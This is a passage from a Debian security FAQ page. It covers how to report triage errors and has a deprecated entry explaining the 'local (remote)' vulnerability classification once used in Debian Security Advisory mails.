[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

---

Back to the [Debian Project homepage](../).

---

This page is also available in the following languages:
Select your language
dansk
Deutsch
español
français
Italiano
Nederlands
polski
Português
suomi
svenska
Русский (Russkij)
中文(简)
中文(HK)
中文(繁)
日本語 (Nihongo)

How to set [the default document language](../intro/cn)

---

**[Home](/)**

* [About](../intro/about)
  + [Social Contract](../social_contract)
  + [Code of Conduct](../code_of_conduct)
  + [Free Software](../intro/free)
  + [Legal Info](../legal)
* [Help Debian](../intro/help)

* [Getting Debian](../distrib/)
  + [Network install](../distrib/netinst)
  + [CD/USB ISO images](../CD/)
  + [Pure Blends](../blends/)
  + [Debian Packages](../distrib/packages)
  + [Developers' Corner](../devel/)

* [News](../News/)
  + [Project News](../News/weekly/)
  + [Events](../events/)
* [Documentation](../doc/)
  + [Release Info](../releases/)
  + [Debian Wiki](https://wiki.debian.org/)

* [Support](../support)
  + [Debian International](../international/)
  + [Security Information](../security/)
  + [Bug reports](../Bugs/)
  + [Mailing Lists](../MailingLists/)

* [Site map](../sitemap)
* [Search](https://search.debian.org/)
* [The Debian Blog](https://bits.debian.org)
* [Debian Micronews](https://micronews.debian.org)
* [Debian Planet](https://planet.debian.org)

See our [contact page](../contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Fri, Oct 6 21:55:11 UTC 2023

Last Built: Sat, Jan 11 19:35:55 UTC 2025

Copyright © 1997-2023 [SPI](https://www.spi-inc.org/) and others; See [license terms](../license)

Debian is a registered [trademark](../trademark) of Software in the Public Interest, Inc.


